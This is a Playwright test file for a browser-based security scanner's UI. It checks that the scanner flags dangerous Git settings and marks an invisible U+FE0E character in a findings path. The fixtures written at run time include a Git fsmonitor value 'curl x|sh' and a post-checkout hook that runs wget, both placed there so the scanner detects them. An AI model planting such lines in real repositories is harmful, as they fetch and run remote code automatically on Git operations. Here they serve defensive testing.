// E2E for the 0.5.4 (round-6) UI fixes on file://. (1) A Git config over the 2 MiB read limit is still parsed (up to
// 16 MiB), so the CRITICAL of its include target is shown and the config is not counted as not scanned (UI 3), a key on
// the section-header line counts (UI 1), and a gitdir: path that leaves the folder and comes back through its own name
// gives no CLI-only note (UI 4). The folder is built at run time with a visible file next to the .git entries; WebKit
// leaves hidden entries (.git) out of a folder given to setInputFiles, so that test does not run there. (2) A U+FE0E
// that draws nothing after a digit is marked in the findings list (UI 7): imported as a findings.json, so it runs in
// every browser. isMobile / hasTouch are not used.
import { expect, test } from '@playwright/test';
import { createHash } from 'node:crypto';
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { pickDir } from './pick-dir';

const INDEX = 'file://' + fileURLToPath(new URL('../../../index.html', import.meta.url));
const h = (s: string) => 'sha256:' + createHash('sha256').update(s).digest('hex');

test('a 3 MB Git config is parsed: its include target gives CRITICAL, no CLI-only note for a path back into the folder', async ({ page, browserName }) => {
  test.skip(browserName === 'webkit', 'WebKit drops hidden entries (.git) from setInputFiles on a directory');
  const base = mkdtempSync(join(tmpdir(), 'zes-r6-'));
  const root = join(base, 'repo');
  try {
    mkdirSync(join(root, '.git'), { recursive: true });
    mkdirSync(join(root, 'sub'), { recursive: true });
    mkdirSync(join(root, 'gd', 'hooks'), { recursive: true });
    writeFileSync(join(root, 'README.md'), 'x\n');
    writeFileSync(join(root, '.git', 'HEAD'), 'ref: refs/heads/main\n');
    writeFileSync(join(root, '.git', 'config'), `[include] path = x.cfg\n#${'a'.repeat(3 * 1024 * 1024)}\n`);
    writeFileSync(join(root, '.git', 'x.cfg'), '[core] fsmonitor = "curl x|sh"\n');
    writeFileSync(join(root, 'sub', '.git'), 'gitdir: ../../repo/gd\n');
    writeFileSync(join(root, 'gd', 'HEAD'), 'ref: x\n');
    writeFileSync(join(root, 'gd', 'hooks', 'post-checkout'), '#!/bin/sh\nwget x\n');
    await page.goto(`${INDEX}?lang=en`);
    await pickDir(page, root);
    await expect(page.locator('[data-testid=finding-row]').filter({ hasText: 'x.cfg' }).first()).toContainText('CRITICAL');
    await expect(page.locator('[data-testid=finding-row]').filter({ hasText: 'post-checkout' }).first()).toContainText('HIGH');
    await expect(page.getByTestId('git-outside')).toHaveCount(0);
    await expect(page.getByTestId('undetermined')).not.toContainText(/Too large \(over 2 MiB\)\s*[1-9]/);
  } finally {
    rmSync(base, { recursive: true, force: true });
  }
});

test('a U+FE0E that draws nothing after a digit is marked in the findings list', async ({ page }) => {
  const doc = JSON.stringify({
    schema_version: '1.0', incident_bundle: 'ZES-2026-OCT-EMERGENCY-V5.2', scan_started_at: '2026-10-24T00:00:00Z', scan_finished_at: '2026-10-24T00:00:01Z',
    scan_mode: 'full', status: 'ok', errors: [],
    findings: [{ id: h('fe0e'), level: 'MEDIUM', module: '§22', campaign: null, path: '/proj/pkg@1︎.0/ci.yml', detail: 'x', evidence_hash: h('e') }],
  });
  await page.goto(`${INDEX}?lang=en`);
  await page.getByTestId('import-input').setInputFiles({ name: 'findings.json', mimeType: 'application/json', buffer: Buffer.from(doc) });
  await expect(page.locator('[data-testid=finding-row]').first()).toContainText('pkg@1⟨U+FE0E⟩.0');
});
